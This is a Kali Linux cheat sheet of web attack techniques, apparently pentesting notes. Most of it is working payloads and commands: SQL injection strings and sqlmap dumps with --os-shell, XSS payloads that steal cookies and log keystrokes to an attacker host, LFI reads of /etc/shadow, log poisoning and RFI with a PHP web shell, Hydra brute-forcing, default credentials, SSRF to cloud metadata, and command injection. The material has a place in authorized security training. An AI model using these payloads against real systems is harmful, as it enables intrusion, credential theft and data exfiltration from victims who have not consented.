






# Kali — Web Attacks

> Web attacks target applications running on HTTP/HTTPS. Always test on authorized targets only.

---

## Methodology

```
Recon (gobuster, nikto, whatweb)
    ↓
Map attack surface (forms, params, headers, cookies)
    ↓
Test each input vector
    ↓
SQLi → XSS → LFI/RFI → SSRF → Upload → Auth bypass
```

---

## Burp Suite

The essential web attack proxy — intercepts and modifies HTTP traffic.

```bash
burpsuite &         # launch
```

### Setup

1. Set browser proxy → `127.0.0.1:8080`
2. Install Burp CA cert in browser (for HTTPS)
3. Browse target → traffic appears in Proxy → Intercept

### Key Tabs

|Tab|Use|
|---|---|
|Proxy|Intercept and modify requests|
|Repeater|Manually resend and tweak requests|
|Intruder|Automated fuzzing / bruteforce|
|Scanner|Automated vuln scan (Pro only)|
|Decoder|Encode/decode base64, URL, HTML|
|Comparer|Diff two requests/responses|

### Useful Shortcuts

```
Ctrl+R      → send to Repeater
Ctrl+I      → send to Intruder
Ctrl+U      → URL encode selection
Right-click → lots of useful options
```

## SQL Injection (SQLi)

Inject SQL into input fields to manipulate database queries.

### Detection

```
' 
''
`
1' OR '1'='1
1' OR 1=1--
" OR ""="
1; DROP TABLE users--
```

### Manual SQLi

```sql
-- auth bypass
' OR 1=1--
' OR '1'='1'--
admin'--

-- UNION based (find number of columns first)
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- extract data
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### sqlmap — Automated SQLi

```bash
sqlmap -u "http://10.0.0.1/page?id=1"              # basic scan
sqlmap -u "http://10.0.0.1/page?id=1" --dbs        # list databases
sqlmap -u "http://10.0.0.1/page?id=1" -D db --tables  # list tables
sqlmap -u "http://10.0.0.1/page?id=1" -D db -T users --dump  # dump table
sqlmap -u "http://10.0.0.1/login" --data="user=a&pass=b" --method POST  # POST
sqlmap -r request.txt                               # from saved Burp request
sqlmap -u "url" --level=5 --risk=3                 # more aggressive
sqlmap -u "url" --os-shell                         # try for shell
```

## Cross-Site Scripting (XSS)

Inject JavaScript into pages viewed by other users.

### Types

|Type|Meaning|
|---|---|
|Reflected|Payload in URL — affects one request|
|Stored|Payload saved in DB — affects all viewers|
|DOM-based|Payload executed via client-side JS|

### Detection Payloads

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
<svg onload=alert(1)>
```

### Useful XSS Payloads

```javascript
// cookie stealing
<script>fetch('http://10.0.0.5/?c='+document.cookie)</script>

// keylogger
<script>document.onkeypress=function(e){fetch('http://10.0.0.5/?k='+e.key)}</script>

// redirect
<script>window.location='http://10.0.0.5'</script>
```

## Local / Remote File Inclusion (LFI/RFI)

### LFI — Read Local Files

```
http://10.0.0.1/page?file=../../../../etc/passwd
http://10.0.0.1/page?file=../../../../etc/shadow
http://10.0.0.1/page?file=../../../../var/log/apache2/access.log
http://10.0.0.1/page?file=php://filter/convert.base64-encode/resource=index.php
```

### LFI → RCE via Log Poisoning

```bash
# 1. inject PHP into user-agent (gets written to access.log)
curl -A "<?php system(\$_GET['cmd']); ?>" http://10.0.0.1/

# 2. include log file and execute
http://10.0.0.1/page?file=../../../../var/log/apache2/access.log&cmd=id
```

### RFI — Include Remote File

```
http://10.0.0.1/page?file=http://10.0.0.5/shell.php
```

```bash
# host malicious file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80
```

## Authentication Attacks

### Default Credentials

```
admin:admin
admin:password
admin:123456
root:root
root:toor
```

### Burp Intruder Bruteforce

```
1. Capture login request in Proxy
2. Send to Intruder
3. Mark username/password as payload positions (§)
4. Load wordlist in Payloads tab
5. Start attack — filter by response length/status
```

### Hydra — Login Bruteforce

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 http-post-form \
"/login:user=^USER^&pass=^PASS^:Invalid password"

hydra -l admin -P rockyou.txt 10.0.0.1 ssh
hydra -l admin -P rockyou.txt 10.0.0.1 ftp
```

## SSRF (Server-Side Request Forgery)

Trick server into making requests to internal resources.

```
http://10.0.0.1/fetch?url=http://127.0.0.1/admin
http://10.0.0.1/fetch?url=http://169.254.169.254/latest/meta-data/  # AWS metadata
http://10.0.0.1/fetch?url=file:///etc/passwd
http://10.0.0.1/fetch?url=http://internal-service:8080
```

## Common Web Attack Workflow

```bash
# 1. recon
nikto -h http://10.0.0.1
gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt

# 2. intercept with Burp — map all parameters

# 3. test SQLi
sqlmap -u "http://10.0.0.1/page?id=1" --dbs

# 4. test XSS in all input fields
<script>alert(1)</script>

# 5. test LFI
http://10.0.0.1/page?file=../../../../etc/passwd

# 6. test command injection
; id
| whoami

# 7. bruteforce login if found
hydra -l admin -P rockyou.txt 10.0.0.1 http-post-form "/login:user=^USER^&pass=^PASS^:Wrong"
```
